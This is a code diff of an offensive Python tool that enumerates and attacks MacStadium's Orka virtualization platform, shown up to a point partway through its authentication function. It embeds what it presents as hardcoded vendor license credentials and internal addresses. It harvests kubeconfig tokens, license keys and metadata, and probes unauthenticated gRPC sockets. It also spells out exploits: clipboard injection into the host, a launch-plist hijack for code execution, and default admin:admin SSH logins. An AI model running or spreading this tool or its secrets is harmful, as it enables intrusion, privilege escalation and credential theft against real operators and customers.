@@ -1,12 +1,26 @@
 #!/usr/bin/env python3
 """
 Orka Platform Enumeration Module
-Synthesized from: MAC-STADIUM reverse engineering findings (F1-F64+)
+Synthesized from: MAC-STADIUM reverse engineering findings (F1-F106)
 
 Enumerate MacStadium Orka platform (K8s-based macOS virtualization).
 Engine: com.macstadium.orka-engine.server (Swift/NIO/gRPC, arm64)
 Runner: com.macstadium.orka-engine.runvz (Virtualization.framework)
-IPC:    /var/run/orka-engine.sock (engine) + run.sock (runvz)
+IPC:    /var/run/orka-engine.sock (engine) + per-VM run.sock (runvz)
+
+New in this revision (F93-F106):
+  F93  Clipboard injection via virtio serial (JSON, no auth)
+  F96  Full ORKA_* env var set; SENTRY_DSN + LICENSE_KEY in plist
+  F97  IPSW auto-download from Apple CDN (ImageDownloadLatestIPSW RPC)
+  F98  VirtualMachineRepartition: destructive disk op, unauthenticated socket
+  F99  Full gRPC service map (VirtualMachineService + ImageService + SystemService)
+  F100 Two OCI layer media types: bv41 disk vs Apple Archive shared image
+  F101 VMBundle dir at /opt/orka; per-VM run.sock bypasses engine socket
+  F102 DHCPParser reads /var/db/dhcpd_leases; ORKA_ENGINE_DHCP_LEASE_TIME
+  F103 orka-engine SwiftUI app on headless node (dead but linked AppKit paths)
+  F104 ORKA_ENGINE_HELPER env var controls runvz path — plist write = privesc
+  F105 All three LicenseSpring credentials hardcoded: api_key + product_code + shared_key
+  F106 LicenseCheckServerInterceptor.shouldCheckLicense() bypass path exists
 """
 
 import subprocess
@@ -16,6 +30,7 @@ import socket
 import hmac
 import hashlib
 import base64
+import stat
 import urllib.request
 import urllib.error
 from datetime import datetime, timezone
@@ -31,9 +46,17 @@ except ImportError:
 def _http_get(url, headers=None, timeout=5):
     """HTTP GET — uses requests if available, falls back to urllib."""
     if _HAS_REQUESTS:
-        r = _requests.get(url, headers=headers or {}, timeout=timeout)
-        r.status_code  # trigger AttributeError if broken
-        return r.status_code, r.text, r.json if r.headers.get('content-type', '').startswith('application/json') else lambda: {}
+        try:
+            r = _requests.get(url, headers=headers or {}, timeout=timeout, verify=False)
+            body = r.text
+            def _json():
+                try:
+                    return r.json()
+                except Exception:
+                    return {}
+            return r.status_code, body, _json
+        except Exception as e:
+            return None, str(e), lambda: {}
     req = urllib.request.Request(url, headers=headers or {})
     try:
         with urllib.request.urlopen(req, timeout=timeout) as resp:
@@ -53,30 +76,50 @@ def _http_get(url, headers=None, timeout=5):
             except Exception:
                 return {}
         return e.code, body, _json
+    except Exception as e:
+        return None, str(e), lambda: {}
 
-# RE-derived constants (com.macstadium.orka-engine.server v3.5.2)
-LICENSESPRING_PRODUCT_UUID = "8ad72323-35e5-477c-ab2c-ea2e080dadc1"
-LICENSESPRING_SHARED_KEY = "C8J7gHUrvMSN52BEQpEYo-zapNplE9XWGR36tifssiE"
-LICENSESPRING_UUID2 = "90ECE379-E9F0-4393-BC58-64FD7F078F7E"
-LICENSESPRING_API = "https://api.licensespring.com"
-ORKA_ENGINE_SOCK = "/var/run/orka-engine.sock"
-ORKA_RUNVZ_SOCK = "run.sock"
-SENTRY_STREAM_URL = "http://localhost:8969/stream"
-ORKA_TEAM_ID = "23KP83Z488"
-ORKA_KEYCHAIN_GROUP = f"{ORKA_TEAM_ID}.*"
-ORKA_BUNDLE_ID = "com.macstadium.orka-engine"
-ORKA_BUILD_PATH = "/Users/devadmin/actions-runner/_work/monorepo-dev/monorepo-dev/packages/orka-engine/"
 
-# All ORKA_ env vars extracted from binary (F69 addendum)
-ORKA_ENV_VARS = [
+# ── RE-derived constants ──────────────────────────────────────────────────────
+# Source: com.macstadium.orka-engine.server + orka-engine CLI, v3.5.2 (arm64)
+
+# LicenseSpring SDK credentials (all three hardcoded in binary, F105)
+LICENSESPRING_API_KEY     = "90ECE379-E9F0-4393-BC58-64FD7F078F7E"   # api_key (F75)
+LICENSESPRING_PRODUCT_CODE = "8ad72323-35e5-477c-ab2c-ea2e080dadc1"  # product_code (F105)
+LICENSESPRING_SHARED_KEY  = "C8J7gHUrvMSN52BEQpEYo-zapNplE9XWGR36tifssiE"  # HMAC key (F105)
+LICENSESPRING_API         = "https://api.licensespring.com"
+
+# Engine IPC paths
+ORKA_ENGINE_SOCK          = "/var/run/orka-engine.sock"
+ORKA_RUNVZ_SOCK_NAME      = "run.sock"       # per-VM bundle subdirectory
+
+# Sentry relay (local)
+SENTRY_STREAM_URL         = "http://localhost:8969/stream"
+
+# Provisioning profile / team (F95)
+ORKA_TEAM_ID              = "23KP83Z488"
+ORKA_KEYCHAIN_GROUP       = f"{ORKA_TEAM_ID}.*"
+ORKA_BUNDLE_ID            = "com.macstadium.orka-engine"
+
+# MacStadium internal build path (F90 — leaked in orka-vm-tools binary)
+ORKA_BUILD_PATH = (
+    "/Users/devadmin/actions-runner/_work/monorepo-dev/"
+    "monorepo-dev/packages/orka-engine/"
+)
+
+# Metadata server (F87 — confirmed port 80)
+ORKA_METADATA_HOST        = "169.254.169.254"
+ORKA_METADATA_PORT        = 80
+
+# All ORKA_* env vars — server binary (16 vars, F96) + CLI-only (1 var, F102)
+ORKA_ENV_VARS_SERVER = [
     'ORKA_CLIPBOARD_SHARING',
     'ORKA_CLUSTER',
     'ORKA_CUSTOMER',
-    'ORKA_ENGINE_DHCP_LEASE_TIME',
     'ORKA_ENGINE_FLUSH',
-    'ORKA_ENGINE_HELPER',
+    'ORKA_ENGINE_HELPER',               # F104 — controls runvz binary path
     'ORKA_ENGINE_LICENSE_KEY',
-    'ORKA_ENGINE_LICENSE_PRODUCT_CODE',  # LicenseSpring product code string
+    'ORKA_ENGINE_LICENSE_PRODUCT_CODE', # LicenseSpring product_code override
     'ORKA_ENGINE_LOG_FILE',
     'ORKA_ENGINE_LOG_LEVEL',
     'ORKA_ENGINE_LOG_STDOUT',
@@ -87,29 +130,62 @@ ORKA_ENV_VARS = [
     'ORKA_ENGINE_VIRTUAL_MACHINE_USER',
     'ORKA_ENVIRONMENT',
 ]
+ORKA_ENV_VARS_CLI_ONLY = [
+    'ORKA_ENGINE_DHCP_LEASE_TIME',      # F102 — overrides DHCP lease duration
+]
+ORKA_ENV_VARS = ORKA_ENV_VARS_SERVER + ORKA_ENV_VARS_CLI_ONLY
 
-# Orka engine filesystem layout (from Ansible role defaults + binary RE)
+# Orka engine filesystem layout (Ansible role defaults + binary RE)
 ORKA_FS = {
-    'binary':     '/usr/local/libexec/orka-engine.app/Contents/MacOS/com.macstadium.orka-engine.server',
-    'runvz':      '/usr/local/libexec/orka-engine.app/Contents/Helpers/Orka Engine Runner.app/Contents/MacOS/com.macstadium.orka-engine.runvz',
-    'helper':     '/usr/local/bin/orka-engine',
-    'sock':       '/var/run/orka-engine.sock',
-    'state_dir':  '/opt/orka',
-    'log':        '/opt/orka/logs/com.macstadium.orka-engine.server.managed.log',
-    'plist':      '/Library/LaunchDaemons/com.macstadium.orka-engine.server.managed.plist',
-    'profile':    '/usr/local/libexec/orka-engine.app/Contents/embedded.provisionprofile',
+    'binary':    '/usr/local/libexec/orka-engine.app/Contents/MacOS/com.macstadium.orka-engine.server',
+    'runvz':     '/usr/local/libexec/orka-engine.app/Contents/Helpers/Orka Engine Runner.app/Contents/MacOS/com.macstadium.orka-engine.runvz',
+    'helper':    '/usr/local/bin/orka-engine',
+    'sock':      '/var/run/orka-engine.sock',
+    'state_dir': '/opt/orka',           # orkaDirURL base path (F101)
+    'vm_dir':    '/opt/orka/vms',       # VMBundle directory (F101)
+    'dhcp_leases': '/var/db/dhcpd_leases',  # F102 — VM MAC→IP oracle
+    'log':       '/opt/orka/logs/com.macstadium.orka-engine.server.managed.log',
+    'plist':     '/Library/LaunchDaemons/com.macstadium.orka-engine.server.managed.plist',
+    'launchagent': '/Library/LaunchAgents/com.macstadium.orka-engine.server.plist',
+    'profile':   '/usr/local/libexec/orka-engine.app/Contents/embedded.provisionprofile',
 }
 
+# OCI media types (F100)
+OCI_MEDIA_TYPES = {
+    'disk_layer': 'application/vnd.macstadium.orka-engine.disk.layer.v1+lz4',
+    'shared_img': 'application/vnd.macstadium.orka-si.image.layer.v1.aar+lz4',
+}
+
+# gRPC service map (F99 — full inventory from ServerInterceptor<X,Y> type pairs)
+ORKA_GRPC_SERVICES = {
+    'VirtualMachineService': [
+        'VMCreate', 'VMStart', 'VMStop', 'VMDelete', 'VMList',
+        'VMGet', 'VMSuspend', 'VMResume', 'VMRevert', 'VMSave',
+        'VMCommit', 'VMInstall', 'VirtualMachineRepartition',   # F98 destructive
+        'VirtualMachineResize', 'VirtualMachineClone',
+    ],
+    'ImageService': [
+        'ImageList', 'ImageDelete', 'ImagePull', 'ImagePush',
+        'ImageDownloadLatestIPSW',   # F97 — pulls from Apple CDN
+        'ImageCommit',
+    ],
+    'SystemService': [
+        'SystemPing',                # F106 — Empty→Empty, SystemProvider.swift
+    ],
+}
+
+
 class OrkaEnumerator:
-    """Enumerate Orka platform"""
-    
+    """Enumerate Orka platform — covers both node-level and VM-level access."""
+
     def __init__(self):
         self.in_orka_vm = False
+        self.on_orka_node = False
         self.orka_api_reachable = False
         self.metadata_server = None
         self.api_servers = [
             'http://10.221.188.20',
-            'http://10.221.188.100'
+            'http://10.221.188.100',
         ]
         self.cluster_info = None
         self.vms = []
@@ -118,358 +194,555 @@ class OrkaEnumerator:
         self.secrets = []
         self.findings = []
         self.token = None
-        
+
+    # ── Main entry point ─────────────────────────────────────────────────────
+
     def enumerate_all(self):
-        """Run all Orka enumeration"""
+        """Run all Orka enumeration checks."""
         self.check_in_orka_vm()
+        self.on_orka_node = self.check_engine_install().get('binary', False)
         self.check_api_reachable()
 
         if self.in_orka_vm:
             self.check_metadata_server()
+            self.probe_clipboard_injection()
+
+        if self.on_orka_node:
+            self.check_vmBundle_dir()
+            self.check_launchagent_writable()
+            self.probe_dhcp_leases()
 
         if self.orka_api_reachable:
-            self.get_cluster_info()  # Unauthenticated endpoint
+            self.get_cluster_info()
             self.check_authentication()
-
             if self.token:
                 self.enumerate_vms()
                 self.enumerate_images()
                 self.enumerate_service_accounts()
 
-        # RE-derived checks — run regardless of Orka API reachability
-        env_vars = self.enumerate_engine_env_vars()
-        self.check_security_issues()
+        self.enumerate_engine_env_vars()
+        self.probe_engine_grpc_socket()
+        self.probe_sentry_stream()
+        self.probe_licensespring()
+
+        if self.token:
+            self.check_security_issues()
 
         return {
-            'in_orka_vm': self.in_orka_vm,
+            'in_orka_vm':       self.in_orka_vm,
+            'on_orka_node':     self.on_orka_node,
             'orka_api_reachable': self.orka_api_reachable,
-            'metadata_server': self.metadata_server,
-            'cluster_info': self.cluster_info,
-            'authenticated': bool(self.token),
-            'vms': self.vms,
-            'images': self.images,
+            'metadata_server':  self.metadata_server,
+            'cluster_info':     self.cluster_info,
+            'authenticated':    bool(self.token),
+            'vms':              self.vms,
+            'images':           self.images,
             'service_accounts': self.service_accounts,
-            'engine_env_vars': env_vars,
-            'findings': self.findings
+            'findings':         self.findings,
         }
 
+    # ── Detection ─────────────────────────────────────────────────────────────
+
+    def check_in_orka_vm(self):
+        """Detect if running inside an Orka VM."""
+        for path in ['/Library/Application Support/Orka', '/usr/local/bin/orka-vm-info']:
+            if Path(path).exists():
+                self.in_orka_vm = True
+                return True
+
+        # Metadata server presence = inside Orka VM (F87 — port 80)
+        sc, body, _ = _http_get(f'http://{ORKA_METADATA_HOST}:{ORKA_METADATA_PORT}/metadata', timeout=2)
+        if sc == 200:
+            self.in_orka_vm = True
+        return self.in_orka_vm
+
+    def check_api_reachable(self):
+        """Check if Orka API server is reachable."""
+        for api_url in self.api_servers:
+            sc, _, _ = _http_get(f'{api_url}/version', timeout=3)
+            if sc == 200:
+                self.orka_api_reachable = True
+                return api_url
+        return None
+
+    # ── Metadata server (VM-side) ─────────────────────────────────────────────
+
+    def check_metadata_server(self):
+        """Enumerate VM metadata server at 169.254.169.254:80 (F87, F88)."""
+        base = f'http://{ORKA_METADATA_HOST}:{ORKA_METADATA_PORT}'
+
+        # /metadata returns {"keys":[...]} (F88)
+        sc, body, get_json = _http_get(f'{base}/metadata', timeout=2)
+        if sc != 200:
+            return None
+
+        data = get_json()
+        keys = data.get('keys', [])
+
+        metadata = {}
+        for key in keys:
+            sc2, body2, _ = _http_get(f'{base}/metadata/{key}', timeout=1)
+            if sc2 == 200:
+                try:
+                    metadata[key] = json.loads(body2).get('value', body2)
+                except Exception:
+                    metadata[key] = body2
+
+        self.metadata_server = {'available': True, 'keys': keys, 'metadata': metadata}
+
+        self.findings.append({
+            'type': 'Unauthenticated VM Metadata Server',
+            'severity': 'HIGH',
+            'description': 'VM metadata accessible at 169.254.169.254:80/metadata without auth (F88)',
+            'detail': f'Keys: {keys}',
+            'exploit': (
+                'curl http://169.254.169.254/metadata — any process in VM reads all metadata. '
+                'Content set by orka-engine via ORKA_VM_METADATA env var (JSON); may include '
+                'CI tokens, VM identity, org info.'
+            ),
+        })
+
+        # Check debug endpoints (F83, F85)
+        for ep in ['/debug/pprof/', '/debug/vars']:
+            sc3, _, _ = _http_get(f'{base}{ep}', timeout=2)
+            if sc3 == 200:
+                self.findings.append({
+                    'type': f'Debug Endpoint Exposed: {ep}',
+                    'severity': 'MEDIUM',
+                    'description': f'Go debug endpoint at 169.254.169.254:80{ep} (F83/F85)',
+                    'detail': f'{base}{ep}',
+                    'exploit': (
+                        'pprof: goroutine stacks + heap dumps. '
+                        'expvar: exported runtime counters.'
+                    ),
+                })
+
+        return self.metadata_server
+
+    # ── Clipboard injection via virtio serial (F93) ───────────────────────────
+
+    def probe_clipboard_injection(self):
+        """Detect virtio serial port available for clipboard injection (F93)."""
+        virtio_paths = ['/dev/tty.virtio', '/dev/cu.virtio', '/dev/ttyS0']
+        for path in virtio_paths:
+            if Path(path).exists():
+                self.findings.append({
+                    'type': 'Virtio Serial Clipboard Injection',
+                    'severity': 'HIGH',
+                    'description': (
+                        f'Virtio serial port {path} present — unauthenticated clipboard injection '
+                        'into host (F93)'
+                    ),
+                    'detail': f'Wire format: {{"action":"clipboard_contents","data":"<payload>"}} + newline',
+                    'exploit': (
+                        f'echo \'{{"action":"clipboard_contents","data":"pwned"}}\' > {path}\n'
+                        'Host clipboard is overwritten. VM isolation boundary crossed. '
+                        'No authentication, no HMAC on message.'
+                    ),
+                })
+                return True
+        return False
+
+    # ── Node-side checks ──────────────────────────────────────────────────────
+
+    def check_engine_install(self):
+        """Detect orka-engine installation on current macOS host (F95, F101)."""
+        indicators = {k: Path(v).exists() for k, v in ORKA_FS.items()}
+
+        if indicators.get('binary'):
+            self.findings.append({
+                'type': 'Orka Engine Installed',
+                'severity': 'INFO',
+                'description': 'orka-engine.server daemon present on this host',
+                'detail': (
+                    f"Team: {ORKA_TEAM_ID} | "
+                    f"Keychain group: {ORKA_KEYCHAIN_GROUP} (wildcard — reads ALL MacStadium keychain items)"
+                ),
+                'exploit': (
+                    'Engine process holds com.apple.vm.networking + keychain-access-groups=23KP83Z488.* '
+                    'entitlements (F95). Compromise engine → full team keychain access.'
+                ),
+            })
+
+        if indicators.get('log'):
+            self.findings.append({
+                'type': 'Orka Engine Log Readable',
+                'severity': 'LOW',
+                'description': 'Engine log may leak license keys, gRPC errors, image paths',
+                'detail': ORKA_FS['log'],
+                'exploit': f'cat {ORKA_FS["log"]} | grep -i license',
+            })
+
+        return indicators
+
+    def check_vmBundle_dir(self):
+        """Check /opt/orka/vms VMBundle directory permissions (F101)."""
+        vm_dir = Path(ORKA_FS['vm_dir'])
+        state_dir = Path(ORKA_FS['state_dir'])
+
+        for check_path in [vm_dir, state_dir]:
+            if not check_path.exists():
+                continue
+            try:
+                st = check_path.stat()
+                mode = stat.filemode(st.st_mode)
+                world_readable = bool(st.st_mode & stat.S_IROTH)
+                world_writable = bool(st.st_mode & stat.S_IWOTH)
+
+                if world_readable or world_writable:
+                    self.findings.append({
+                        'type': f'VMBundle Directory Permissive: {check_path}',
+                        'severity': 'HIGH',
+                        'description': (
+                            f'{check_path} is {mode} — VMBundle dirs (config.json, metadata.json, '
+                            'run.sock) may be accessible (F101)'
+                        ),
+                        'detail': f'UID: {st.st_uid} GID: {st.st_gid} Mode: {mode}',
+                        'exploit': (
+                            f'ls {check_path}/*/run.sock 2>/dev/null — per-VM Unix sockets '
+                            'for runvz. Direct gRPC to runvz bypasses engine auth entirely.'
+                        ),
+                    })
+            except PermissionError:
+                pass
+
+        # Probe any per-VM run.sock we can reach
+        self._probe_vm_runsocks(vm_dir)
+
+    def _probe_vm_runsocks(self, vm_dir):
+        """Find and probe per-VM run.sock files (F101)."""
+        if not vm_dir.exists():
+            return
+        try:
+            for entry in vm_dir.iterdir():
+                sock_path = entry / ORKA_RUNVZ_SOCK_NAME
+                if not sock_path.exists():
+                    continue
+                try:
+                    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+                    s.settimeout(1)
+                    s.connect(str(sock_path))
+                    s.sendall(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
+                    banner = s.recv(64)
+                    s.close()
+                    self.findings.append({
+                        'type': f'Per-VM runvz Socket Accessible: {sock_path}',
+                        'severity': 'CRITICAL',
+                        'description': 'Direct access to runvz (Virtualization.framework) without engine auth (F101)',
+                        'detail': f'Banner: {banner[:32]!r}',
+                        'exploit': 'Craft raw protobuf RPCs against runvz to control VM lifecycle',
+                    })
+                except Exception:
+                    pass
+        except PermissionError:
+            pass
+
+    def check_launchagent_writable(self):
+        """Check if LaunchAgent/LaunchDaemon plist is writable (F104)."""
+        targets = [
+            (ORKA_FS['plist'],       'LaunchDaemon (server)'),
+            (ORKA_FS['launchagent'], 'LaunchAgent (CLI)'),
+        ]
+        for plist_path, label in targets:
+            p = Path(plist_path)
+            if not p.exists():
+                continue
+            try:
+                st = p.stat()
+                mode = stat.filemode(st.st_mode)
+                writable_by_others = bool(st.st_mode & (stat.S_IWGRP | stat.S_IWOTH))
+                if writable_by_others or os.access(plist_path, os.W_OK):
+                    self.findings.append({
+                        'type': f'Orka LaunchAgent Plist Writable: {plist_path}',
+                        'severity': 'CRITICAL',
+                        'description': (
+                            f'{label} plist writable — setting ORKA_ENGINE_HELPER to attacker binary '
+                            'gives arbitrary code execution with com.apple.vm.networking + '
+                            'keychain-access-groups=23KP83Z488.* entitlements (F104)'
+                        ),
+                        'detail': f'Mode: {mode} | UID: {st.st_uid}',
+                        'exploit': (
+                            f'Edit {plist_path} → set ORKA_ENGINE_HELPER=/tmp/evil → '
+                            'launchctl unload/load → evil binary executes as engine with full entitlements'
+                        ),
+                    })
+            except PermissionError:
+                pass
+
+    def probe_dhcp_leases(self):
+        """Check /var/db/dhcpd_leases readability — VM MAC→IP oracle (F102)."""
+        leases_path = ORKA_FS['dhcp_leases']
+        if not Path(leases_path).exists():
+            return None
+
+        try:
+            content = Path(leases_path).read_text(errors='replace')
+            # Parse simple key=value lease blocks
+            leases = []
+            current = {}
+            for line in content.splitlines():
+                line = line.strip()
+                if line == '{':
+                    current = {}
+                elif line == '}':
+                    if current:
+                        leases.append(current)
+                    current = {}
+                elif '=' in line:
+                    k, _, v = line.partition('=')
+                    current[k.strip()] = v.strip()
+
+            if leases:
+                self.findings.append({
+                    'type': 'DHCP Lease File Readable',
+                    'severity': 'MEDIUM',
+                    'description': f'/var/db/dhcpd_leases readable — maps VM MAC→IP for all {len(leases)} VMs (F102)',
+                    'detail': f'First lease: {leases[0]}',
+                    'exploit': (
+                        'Read leases to enumerate all VM IPs on node. '
+                        'Forge/modify leases to redirect engine VM IP resolution.'
+                    ),
+                })
+                return leases
+        except PermissionError:
+            pass
+        return None
+
+    # ── Env var harvesting ────────────────────────────────────────────────────
+
     def enumerate_engine_env_vars(self):
-        """Harvest ORKA_ env vars from current process environment and launchd plist"""
+        """Harvest ORKA_* env vars from current environment and plist (F96)."""
         found = {}
 
-        # Check current environment
         for var in ORKA_ENV_VARS:
             val = os.getenv(var)
             if val:
                 found[var] = val
 
-        # Try to read the managed plist (contains license key + sock path)
-        plist_path = ORKA_FS['plist']
-        if Path(plist_path).exists():
+        # Try LaunchDaemon plist (F96 — contains license key + DSN)
+        for plist_path in [ORKA_FS['plist'], ORKA_FS['launchagent']]:
+            if not Path(plist_path).exists():
+                continue
             try:
                 result = subprocess.run(
                     ['plutil', '-convert', 'json', '-o', '-', plist_path],
-                    capture_output=True, text=True, timeout=3
+                    capture_output=True, text=True, timeout=3,
                 )
                 if result.returncode == 0:
                     plist = json.loads(result.stdout)
-                    env_dict = {}
-                    env_array = plist.get('EnvironmentVariables', {})
-                    if isinstance(env_array, dict):
-                        env_dict = env_array
-                    for k, v in env_dict.items():
-                        if k.startswith('ORKA_'):
-                            found[k] = v
+                    env_dict = plist.get('EnvironmentVariables', {})
+                    if isinstance(env_dict, dict):
+                        for k, v in env_dict.items():
+                            if k.startswith('ORKA_'):
+                                found[k] = v
             except Exception:
                 pass
 
-        # Report license key if found
         if 'ORKA_ENGINE_LICENSE_KEY' in found:
             self.findings.append({
                 'type': 'Orka License Key Exposed',
                 'severity': 'HIGH',
-                'description': 'ORKA_ENGINE_LICENSE_KEY found in environment or plist',
+                'description': 'ORKA_ENGINE_LICENSE_KEY found in environment or plist (F96)',
                 'detail': f"Key: {found['ORKA_ENGINE_LICENSE_KEY'][:8]}...",
-                'exploit': 'License key enables cloning/rehosting of Orka engine without purchase'
+                'exploit': (
+                    'License key + shared_key → LicenseSpring SDK API → enumerate all '
+                    'hardware_ids bound to this product (customer node inventory).'
+                ),
             })
 
         if 'ORKA_ENGINE_SENTRY_DSN' in found:
             self.findings.append({
                 'type': 'Sentry DSN Exposed',
                 'severity': 'MEDIUM',
-                'description': 'ORKA_ENGINE_SENTRY_DSN found — Sentry project DSN accessible',
+                'description': 'ORKA_ENGINE_SENTRY_DSN found — MacStadium Sentry project DSN accessible (F96)',
                 'detail': found['ORKA_ENGINE_SENTRY_DSN'],
-                'exploit': 'DSN allows sending fake crash reports to MacStadium Sentry project'
+                'exploit': (
+                    'POST fake crash events to MacStadium Sentry project. '
+                    'DSN authorizes event submission (write-only, but floods their alerting).'
+                ),
+            })
+
+        if 'ORKA_ENGINE_HELPER' in found:
+            self.findings.append({
+                'type': 'ORKA_ENGINE_HELPER Path Override Active',
+                'severity': 'HIGH',
+                'description': 'ORKA_ENGINE_HELPER set — non-default runvz binary path in use (F104)',
+                'detail': f"Helper: {found['ORKA_ENGINE_HELPER']}",
+                'exploit': 'If path is attacker-controlled, runvz is replaced. Check binary at path.',
             })
 
         return found
-    
-    def check_in_orka_vm(self):
-        """Detect if running inside Orka VM"""
-        # Check for orka-vm-tools
-        orka_tools = [
-            '/Library/Application Support/Orka',
-            '/usr/local/bin/orka-vm-info'
-        ]
-        
-        for path in orka_tools:
-            if Path(path).exists():
-                self.in_orka_vm = True
-                return True
-        
-        # Check for metadata server
-        try:
-            response = requests.get('http://169.254.169.254/metadata/keys', timeout=2)
-            if response.status_code == 200:
-                self.in_orka_vm = True
-                return True
-        except:
-            pass
-        
-        return False
-    
-    def check_api_reachable(self):
-        """Check if Orka API server is reachable"""
-        for api_url in self.api_servers:
-            try:
-                response = requests.get(f'{api_url}/version', timeout=3)
-                if response.status_code == 200:
-                    self.orka_api_reachable = True
-                    return api_url
-            except:
-                pass
-        
-        return None
-    
-    def check_metadata_server(self):
-        """Enumerate VM metadata server (169.254.169.254)"""
-        try:
-            # List all metadata keys
-            response = requests.get('http://169.254.169.254/metadata/keys', timeout=2)
-            if response.status_code == 200:
-                keys = response.json()
-                
-                metadata = {}
-                for key in keys:
-                    try:
-                        val_response = requests.get(f'http://169.254.169.254/metadata/{key}', timeout=1)
-                        if val_response.status_code == 200:
-                            metadata[key] = val_response.text
-                    except:
-                        pass
-                
-                self.metadata_server = {
-                    'available': True,
-                    'keys': keys,
-                    'metadata': metadata
-                }
-                
-                # Security finding: unauthenticated metadata server
-                self.findings.append({
-                    'type': 'Unauthenticated Metadata Server',
-                    'severity': 'HIGH',
-                    'description': 'VM metadata accessible at 169.254.169.254 without authentication',
-                    'detail': f'Found {len(keys)} metadata keys',
-                    'exploit': 'Any process in VM can read all metadata (may contain secrets)'
-                })
-        except:
-            pass
-        
-        return self.metadata_server
-    
+
+    # ── Cluster API ──────────────────────────────────────────────────────────
+
     def get_cluster_info(self):
-        """Get cluster info (UNAUTHENTICATED endpoint F1)"""
+        """Get cluster info from unauthenticated endpoint (F1)."""
         for api_url in self.api_servers:
-            try:
-                response = requests.get(f'{api_url}/api/v1/cluster-info', timeout=3)
-                if response.status_code == 200:
-                    self.cluster_info = response.json()
-                    
-                    # Security finding: unauthenticated cluster-info
-                    self.findings.append({
-                        'type': 'Unauthenticated cluster-info',
-                        'severity': 'MEDIUM',
-                        'description': 'Cluster info exposed without authentication (F1)',
-                        'detail': f"K8s API: {self.cluster_info.get('apiEndpoint', 'N/A')}",
-                        'exploit': 'Exposes K8s CA cert, OAuth client ID before auth'
-                    })
-                    
-                    return self.cluster_info
-            except:
-                pass
-        
+            sc, body, get_json = _http_get(f'{api_url}/api/v1/cluster-info', timeout=3)
+            if sc == 200:
+                self.cluster_info = get_json()
+                self.findings.append({
+                    'type': 'Unauthenticated cluster-info',
+                    'severity': 'MEDIUM',
+                    'description': 'Cluster info exposed without authentication (F1)',
+                    'detail': f"K8s API: {self.cluster_info.get('apiEndpoint', 'N/A')}",
+                    'exploit': 'Exposes K8s CA cert, OAuth client ID, cluster topology before auth.',
+                })
+                return self.cluster_info
         return None
-    
+
     def check_authentication(self):
-        """Check for Orka/K8s authentication"""
-        # Check for orka3 CLI token in ~/.kube/config
+        """Find Orka/K8s token from kubeconfig or env."""
         kubeconfig = Path.home() / '.kube' / 'config'
-        
         if kubeconfig.exists():
             try:
-                with open(kubeconfig) as f:
-                    import yaml
-                    config = yaml.safe_load(f)
-                    
-                    # Look for orka context/user
-                    for user in config.get('users', []):
-                        if 'token' in user.get('user', {}):
-                            self.token = user['user']['token']
-                            break
-            except:
-                pass
-        
-        # Check environment variable
-        if not self.token:
-            self.token = os.getenv('ORKA_TOKEN') or os.getenv('K8S_TOKEN')
-        
-        return bool(self.token)
-    
-    def enumerate_vms(self):
-        """List VMs (requires auth)"""
-        if not self.token:
-            return []
-        
-        for api_url in self.api_servers:
-            try:
-                headers = {'Authorization': f'Bearer {self.token}'}
-                
-                # List namespaces first
-                ns_response = requests.get(f'{api_url}/api/v1/namespaces', headers=headers, timeout=5)
-                if ns_response.status_code == 200:
-                    namespaces = ns_response.json()
-                    
-                    # Enumerate VMs in each namespace
-                    for ns in namespaces:
-                        ns_name = ns.get('name', 'orka-default')
-                        vm_response = requests.get(
-                            f'{api_url}/api/v1/namespaces/{ns_name}/vms',
-                            headers=headers,
-                            timeout=5
-                        )
-                        
-                        if vm_response.status_code == 200:
-                            vms_data = vm_response.json()
-                            for vm in vms_data:
-                                self.vms.append({
-                                    'name': vm.get('vm_name'),
-                                    'namespace': ns_name,
-                                    'status': vm.get('vm_status'),
-                                    'ip': vm.get('vnc_host'),
-                                    'ssh_port': vm.get('ssh_port', 8822),
-                                    'vnc_port': vm.get('vnc_port', 5999)
-                                })
-                                
-                                # Check for default credentials
-                                if vm.get('ssh_port'):
-                                    self.findings.append({
-                                        'type': 'VM with Default Credentials',
-                                        'severity': 'CRITICAL',
-                                        'description': f"VM {vm.get('vm_name')} likely has admin:admin (F2)",
-                                        'detail': f"SSH: {vm.get('vnc_host')}:{vm.get('ssh_port', 8822)}",
-                                        'exploit': 'ssh admin@{ip} -p {port} (password: admin)'
-                                    })
-            except:
-                pass
-        
-        return self.vms
-    
-    def enumerate_images(self):
-        """List images (requires auth)"""
-        if not self.token:
-            return []
-        
-        for api_url in self.api_servers:
-            try:
-                headers = {'Authorization': f'Bearer {self.token}'}
-                
-                # Default namespace
-                response = requests.get(
-                    f'{api_url}/api/v1/namespaces/orka-default/images',
-                    headers=headers,
-                    timeout=5
-                )
-                
-                if response.status_code == 200:
-                    self.images = response.json()
-            except:
-                pass
-        
-        return self.images
-    
-    def enumerate_service_accounts(self):
-        """List service accounts (requires auth)"""
-        if not self.token:
-            return []
-        
-        for api_url in self.api_servers:
-            try:
-                headers = {'Authorization': f'Bearer {self.token}'}
-                
-                response = requests.get(
-                    f'{api_url}/api/v1/namespaces/orka-default/serviceaccounts',
-                    headers=headers,
-                    timeout=5
-                )
-                
-                if response.status_code == 200:
-                    self.service_accounts = response.json()
-            except:
-                pass
-        
-        return self.service_accounts
-    
-    def probe_engine_grpc_socket(self):
-        """Probe orka-engine Unix gRPC socket (host-side only, macOS target)"""
-        result = {'engine_sock': False, 'runvz_sock': False}
-
-        for sock_path, key in [(ORKA_ENGINE_SOCK, 'engine_sock'), (ORKA_RUNVZ_SOCK, 'runvz_sock')]:
-            if not Path(sock_path).exists():
-                continue
-            try:
-                s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
-                s.settimeout(1)
-                s.connect(sock_path)
-                # Send minimal HTTP/2 preface to detect gRPC
-                s.sendall(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
-                banner = s.recv(64)
-                s.close()
-                result[key] = True
-                self.findings.append({
-                    'type': f'Orka gRPC Socket Accessible ({sock_path})',
-                    'severity': 'CRITICAL',
-                    'description': f'Orka engine gRPC Unix socket readable without auth',
-                    'detail': f'Banner: {banner[:32]!r}',
-                    'exploit': 'Craft protobuf RPCs to VirtualMachineStart/ImagePull without auth token'
-                })
+                import yaml
+                config = yaml.safe_load(kubeconfig.read_text())
+                for user in config.get('users', []):
+                    token = user.get('user', {}).get('token')
+                    if token:
+                        self.token = token
+                        break
             except Exception:
                 pass
 
-        return result
+        if not self.token:
+            self.token = os.getenv('ORKA_TOKEN') or os.getenv('K8S_TOKEN')
 
-    def probe_sentry_stream(self):
